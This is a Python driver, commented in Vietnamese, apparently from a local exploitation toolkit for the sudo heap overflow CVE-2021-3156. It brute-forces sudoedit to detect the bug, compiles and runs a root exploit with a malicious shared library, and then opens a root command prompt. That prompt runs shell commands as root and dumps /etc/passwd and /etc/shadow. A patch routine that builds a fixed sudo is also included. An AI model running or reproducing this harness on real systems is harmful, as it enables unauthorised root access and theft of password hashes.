'''
b1: xây dựng file leo quyền
b2: build file leo quyền thành libc
b3: xây dựng file exploit 
b4: buid file exploit
b5: chạy file exploit
'''

from pwn import process
from importFile import root_directory,shlex,subprocess,os
from executeCommand import executeInteractive, executeOnce
from formatOutput.prettyAnnounce import log,bcolors
from util import clean_terminal, decompress_gz, download_file, is_path_exist, list_ext_at_path,list_process, list_dir,list_process_as_root,list_dir_verbose,leak, print_stdout_stderr, stop_terminal
from cmd import Cmd
from findInfoSystem import is_Linux
from menu_list import entry_dynamic_menu

exploit_executable_name = 'poc'
lpe_libc_name = 'lpe_libc.so.2'
module_root_path = root_directory + "/linux/cve_2021_3156/"
exploit_src_path = module_root_path+'exploit.c'
exploit_executable_path = module_root_path+'poc'
lpe_src_path = module_root_path + "lpe_libc.c"
lpe_dir = module_root_path +"libnss_a"

def check_version():
    command = ['sudo', '-V']
    output = subprocess.run(command,capture_output=True)
    print(output.stdout.decode())

def check_vuln():
    is_vuln = False
    if(is_Linux()==False):
        log.fail("Hệ thống của bạn không phải linux ! Thoát chương trình !")
        exit(1)
    else:
        error_key = b'malloc():'
        for len_a in range(0,500):
            for len_b in range(0,500):
                brute_force_argument = [
                    "/usr/bin/sudoedit",
                    '-s',
                    'a'*len_a+'\\',
                    'b'*len_b
                ]
                output = subprocess.run(
                    brute_force_argument,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
                print(output)
                if(error_key in output.stderr 
                    or error_key in output.stdout 
                    or output.returncode < 0):
                    is_vuln = True
                    return is_vuln
        return is_vuln

def build_get_root_libc():
    '''
    Compile file get root libc thành shared libc
    '''
    if(is_path_exist(lpe_dir) == True):
        log.info("Phát hiện thư mục shared object cũ ! Thực hiện xoá !")
        executeOnce(f"rm -rf {lpe_dir}")
    log.info("Khởi tạo thư mục shared object mới")
    executeOnce(f"mkdir {lpe_dir}")
    log.done("Khởi tạo thư mục shared object mới thành công !")
    log.info("Biên dịch source tạo thành đối tượng shared libc !")
    check = executeOnce(f"gcc -fPIC -shared -o {lpe_dir}/{lpe_libc_name} {lpe_src_path}")
    # print(check)
    if(b'error' in check.stderr):
        log.fail("Biên dịch thất bại, xin hãy báo cáo với admin !")
        return False
    else:
        log.done(f"Biên dịch thành công, shared libc nằm ở thư mục {lpe_dir}")
        return True

def build_exploit():
    '''
    Compile file exploit thành file thực thi
    '''
    
    if(is_path_exist(exploit_src_path)==True):
        log.info("Biên dịch mã nguồn khai thác lỗi.")
        check = executeOnce(f"gcc -std=c99 -o {module_root_path}/poc {exploit_src_path}")
        # print(check)
        if(check.returncode<0):
            log.fail("Biên dịch thất bại, xin hãy báo cáo với admin !")
            return False
        else:
            log.done(f"Biên dịch thành công, tệp thực thi khai thác nằm ở thư mục {module_root_path}/poc")
            return True

def run():
    clean_terminal()
    os.chdir(module_root_path)
    if(build_get_root_libc() == True and build_exploit()==True):
        log.info("Bắt đầu chạy tệp tin khai thác !")
        s = process(exploit_executable_path)
        # s.interactive()
        s.sendline('id')
        output = s.recvline()
        if(b'root' not in output):
            log.fail("Khai thác thất bại! Không thể lấy quyền root! Liên lạc admin!")
        else:
            promt = succes_promt(s)
            promt.cmdloop()

def fix_bug():
    '''
    Thực hiện các bước vá lỗi cve 2021-3156
    B1: tải bản vá
    B2: giải nén bản vá
    B3: cài đặt bản vá
    '''
    log.warning("Chức năng này yêu cầu thực thi với quyền root do đó bạn cần cung cấp mật khẩU !")
    log.warning("Bạn có đồng ý thực hiện chức năng không? [y/n]")
    choice = str(input(">>> ").strip('\n'))
    while(choice not in ['y','n']):
        log.warning("Lựa chọn không hợp lý! Xin hãy nhập đúng lựa chọn!")
        choice = input(">>> ")
    
    if(choice == 'n'):
        return
    elif choice == 'y':
        destionation_path = module_root_path+'patched_dir'
        file_name = 'sudo-1.9.5p2.tar.gz'
        if(is_path_exist(destionation_path)==False):
            os.mkdir(destionation_path)
        ret = download_file('https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz',file_name,destionation_path)
        if(ret == 1):
            log.done("Đã tải xong tệp vá lỗi!")
            log.info("Giải nén tệp vá lỗi!")
            os.chdir(destionation_path)
            ret_2 = decompress_gz(destionation_path+'/'+file_name)
            if ret_2>=0:
                log.done("Giải nén thành công!")
                log.info("Cài đặt tệp vá lỗi!")
                decompress_folder = 'sudo-1.9.5p2'
                os.chdir(destionation_path+'/'+decompress_folder)
                print_stdout_stderr(executeOnce('sudo apt-get update'))
                print_stdout_stderr(executeOnce("sudo apt-get install make"))
                print_stdout_stderr(executeOnce('sudo apt-get install build-essential'))
                print_stdout_stderr(executeOnce('sudo ./configure'))
                print_stdout_stderr(executeOnce('sudo make'))
                print_stdout_stderr(executeOnce('sudo make install'))


        stop_terminal()



def entry_menu():
    while(1):
        clean_terminal()
        options_l = ["Khai thác cve", "Vá lỗ hổng"]
        choice = entry_dynamic_menu(options_l,len(options_l),'[cve_2021_3156]')
        if(choice == '0'):
            return
        elif choice == '1':
            run()
        elif choice == '2':
            fix_bug()

def entry():
    '''
    Đầu vào cho cve
     - Kiểm tra có dính lỗi?
        + Thoát nếu không
        + Vào menu chức năng, nếu có
    '''
    clean_terminal()
    log.info("brute force hệ thống để tìm lỗi\n".upper())
    if check_vuln() == True:
        print(end='\n')
        log.warning("hệ thống phát hiện lỗi\n".upper())
        stop_terminal()
        entry_menu()
        
    else:
        log.info("Hệ thống của bạn không có lỗi này! Ấn Enter để trở lại (Enter) !")
    
    


class succes_promt(Cmd):
    
    def __init__(self, proc:process):
        super().__init__()
        self.proc = proc
    def emptyline(self) -> bool:
        return

    intro = f'{bcolors.OKCYAN}Giao diện giao tiếp root ... Gõ ? để xem danh sách chức năng{bcolors.ENDC}'
    prompt = f'{bcolors.WARNING}root{bcolors.ENDC} {bcolors.BOLD}>>>{bcolors.ENDC} '
    doc_header = f"{bcolors.OKGREEN}Gõ help <command> để xem cách sử dụng{bcolors.ENDC}"
    undoc_header = f"{bcolors.OKGREEN}Một số command khác{bcolors.ENDC}"

    def do_help(self, arg: str) :
        '''Hướng dẫn sử dụng các câu lệnh trong trình giao tiếp'''
        return super().do_help(arg)
    
    def do_exit(self, arg):
        '''Thoát giao diện giao tiếp root'''
        
        self.proc.close()
        log.done("Đóng root shell!")
        log.done("Thoát tiến trình khai thác!")
        input("Ấn Enter để tiếp tục")
        return True
    
    def do_shell(self,arg):
        '''
        Trực tiếp thao tác trên shell bằng quyền của root
            - qexit để thoát khỏi shell
            - exit để đóng root shell (không thể truy cập lại)
        '''
        s = self.proc
        if(s.poll()==None):
            while(1):
                promt_symbols = f"{bcolors.FAIL}# {bcolors.ENDC}"
                command = str(input(promt_symbols)).strip('\n')
                if(command == 'qexit'):
                    log.info("Thoát root shell!")
                    break
                try:
                    s.sendline(command)
                    while(True):
                        out = s.recvline(timeout=0.3).strip(b'\n').decode()
                        if(out==''):
                            break
                        print(out)
                except:
                    log.info("Tiến trình root shell đã đóng!")
                    break
        else:
            log.fail("Tiến trình root shell đã đóng!")
    
    def do_list_process(self,arg):
        '''
        Cách sử dụng:

        list_process [normal/root]

        normal : Lấy thông tin các tiến trình trên hệ thống với quyền user thường
        root   : lấy thông tin các tiến trình trên hệ thống với quyền user root

        ví du: list_process root
        Kết quả:
        [*]  USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
        [*]  root         1  0.0  0.0    900   532 ?        Sl   09:38   0:00 /init
        '''
        if arg == 'root':
            process_l = list_process_as_root(self.proc)
        else:
            process_l = list_process()

        if process_l == -1:
            log.fail("Thực hiện lấy tiến trình xảy ra lỗi!")
        elif process_l == -2:
            log.fail("Hệ điều hành của bạn không phải linux! Chức năng chưa được xây dựng!")
        else:
            for line in process_l:
                log.info(line)
    
    def do_leak(self,arg):
        '''
        Lấy thông tin của file user và passwd
        Cách sử dụng:
        leak [passwd/shadow]

        passwd: file chứa mật khẩu của tất cả user trên hệ thống
        shadow: file chứa tất cả user trên hệ thống
        '''
        reponse = leak(arg, self.proc)
        if(reponse == -1):
            log.fail("Đối số của câu lệnh không đúng !")
        elif reponse == -2:
            log.fail("Thực hiện lấy thông tin file lỗi! Tiến trình root có thể bị đóng!")
        else:
            for line in reponse:
                log.info(line)

    def do_tree_path(self,arg):
        '''
        Liệt kê các tệp tin trong đường dẫn được cung cấp

        Cách sử dụng:
        tree_path [-option] [path]
        
        option:
            -v: chế độ chi tiết, liệt kê tất cả: thư mục, tệp tin, tệp ẩn,...
                Lưu ý: trong chế độ này, không nên chọn thư mục có quá nhiều tệp tin sâu, như / (root path), /usr, /home,...
                Sẽ tốn thời gian rất lâu để liệt kê hết. 
            -d: chế độ chỉ xem các tệp là thư mục. 
        ví dụ: 
                root >>> tree_path -d /
                ├── home
                ├── srv
                ├── etc
                ├── opt
                ├── root
                ├── lib
                ├── mnt
        ví dụ: 
                root >>> tree_path -v /home/cheaterdxd/dttn/
                ├── linux
                │   ├── readme.txt
                │   └── cve_2021_3156
                │       ├── __pycache__
                │       │   ├── run_exploit.cpython-310.pyc
                │       │   └── run_exploit.cpython-36.pyc
                │       ├── lpe_libc.c
                │       ├── run_exploit.py
                │       ├── libnss_a
                │       │   └── lpe_libc.so.2
                │       ├── exploit.c
                │       └── poc
        '''
        arg_l = shlex.split(arg)
        if(arg_l[0] not in ['-d','-v']):
            log.fail("Đối số option không chính xác. Vui lòng kiểm tra lại!")
        else:
            if(arg_l[0] == '-v'):
                list_dir_verbose(arg_l[1])
            else:
                list_dir(arg_l[1])

    def do_findext(self, arg):
        '''
        Liệt kê tất cả các file theo định dạng đuôi
        -e [file ext] [path_file]
        '''
        arg_l = shlex.split(arg)
        options = ['-e']
        path_find = arg_l[2]
        file_ext = arg_l[1]
        if(arg_l[0] not in options):
            print(arg)
            log.fail("Đối số không chính xác, vui lòng kiểm tra lại!")
        else:
            list_f_resp = list_ext_at_path(path_find,file_ext)
            for f in list_f_resp:
                print(f)


